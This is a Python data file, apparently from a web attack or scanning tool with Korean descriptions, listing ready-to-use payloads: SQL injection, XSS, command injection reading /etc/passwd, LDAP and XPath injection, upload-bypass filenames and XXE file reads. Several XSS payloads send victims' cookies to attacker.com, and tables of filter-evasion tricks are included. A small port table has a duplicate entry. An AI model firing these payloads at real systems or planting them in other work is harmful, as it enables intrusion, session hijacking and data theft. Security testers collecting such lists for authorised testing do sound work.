PAYLOADS_DATABASE = {
    "sql_injection": {
        "union": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT @@version--",
            "' UNION SELECT database()--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns--",
        ],
        "time_based": [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND BENCHMARK(10000000,MD5('test'))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SLEEP(3))))--",
        ],
        "boolean": [
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
        ],
        "error_based": [
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            "' AND (SELECT COUNT(*),CONCAT(version(),0x7e,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)--",
            "' AND @@version--",
        ],
    },
    "xss": {
        "basic": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=\"alert('XSS')\">",
            "<svg onload=\"alert('XSS')\">",
            "<body onload=\"alert('XSS')\">",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        ],
        "advanced": [
            "<img src=x onerror=\"fetch('http://attacker.com?c='+document.cookie)\">",
            "<svg onload=\"new Image().src='http://attacker.com?c='+document.cookie\">",
            "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
        ],
        "event_handlers": [
            "onload", "onerror", "onmouseover", "onmouseout", "onfocus", "onblur",
            "onchange", "onclick", "ondblclick", "onkeydown", "onkeyup", "onsubmit",
            "onmouseenter", "onmouseleave", "onwheel", "onscroll"
        ],
    },
    "command_injection": [
        "; ls",
        "; cat /etc/passwd",
        "| whoami",
        "& ipconfig",
        "&& whoami",
        "|| whoami",
        "`whoami`",
        "$(whoami)",
        "\n ls",
        "\r\n whoami",
        "; id; echo",
    ],
    "ldap_injection": [
        "*",
        "*)(|(uid=*",
        "admin*",
        "*)(|(cn=*",
        "*)(&(uid=*",
        "*)(|(mail=*",
        "admin*)(|(cn=admin",
    ],
    "xpath_injection": [
        "' or '1'='1",
        "' or 1=1 or '",
        "admin' or 'a'='a",
        "') or ('1'='1",
        "' and substring(//password/text(),1,1)='a' or '",
    ],
    "file_upload": {
        "dangerous_extensions": [
            ".php", ".php3", ".php4", ".php5", ".phtml", ".php7",
            ".jsp", ".jspx", ".war", ".asp", ".aspx", ".cgi",
            ".exe", ".sh", ".bat", ".cmd", ".com",
        ],
        "bypass_techniques": [
            "shell.php.jpg", "shell.jpg.php", "shell.php%00.jpg",
            "shell.phtml", "shell.shtml", "shell.htaccess",
            "..\\..\\..\\shell.php",
        ],
    },
    "xxe": [
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>''',
        '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<data>&xxe;</data>''',
    ],
}

ENCODING_TECHNIQUES = {
    "url_encoding": {
        "description": "URL 인코딩",
        "characters_encoded": "공백, 특수문자 등",
    },
    "base64": {
        "description": "Base64 인코딩",
        "use_case": "바이너리 데이터 전송",
    },
    "hex": {
        "description": "16진수 인코딩",
        "use_case": "바이트 단위 표현",
    },
    "html_entities": {
        "description": "HTML 엔티티 인코딩",
        "use_case": "웹 페이지 문자 표현",
    },
    "unicode": {
        "description": "유니코드 인코딩",
        "use_case": "다국어 지원",
    },
    "rot13": {
        "description": "ROT13 치환",
        "use_case": "간단한 난독화",
    },
}

TAMPER_TECHNIQUES = {
    "space_replacement": [
        ("공백", "%09"),
        ("공백", "%0a"),
        ("공백", "%0b"),
        ("공백", "%0c"),
        ("공백", "/**/"),
        ("공백", ""),
    ],
    "case_manipulation": "대소문자 랜덤 변환",
    "comment_injection": "주석 삽입 우회",
    "character_encoding": "특정 문자 인코딩",
}

DETECTION_SIGNATURES = {
    "mysql": ["mysql", "sql error", "warning", "mysql_fetch"],
    "postgresql": ["postgresql", "pgsql", "postgres"],
    "mssql": ["mssql", "sql server", "sysobjects"],
    "oracle": ["oracle", "ora-"],
    "mongodb": ["mongodb", "mongo"],
}

COMMON_PORTS = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    69: "TFTP",
    80: "HTTP",
    110: "POP3",
    143: "IMAP",
    389: "LDAP",
    443: "HTTPS",
    445: "SMB",
    465: "SMTPS",
    587: "SMTP",
    636: "LDAPS",
    993: "IMAPS",
    995: "POP3S",
    1433: "MSSQL",
    1521: "Oracle",
    3306: "MySQL",
    3389: "RDP",
    5432: "PostgreSQL",
    5432: "PostgreSQL",
    5984: "CouchDB",
    6379: "Redis",
    7001: "AJP13",
    8080: "HTTP-Alt",
    8443: "HTTPS-Alt",
    8888: "HTTP-Alt",
    9200: "Elasticsearch",
    27017: "MongoDB",
    50070: "Hadoop",
}
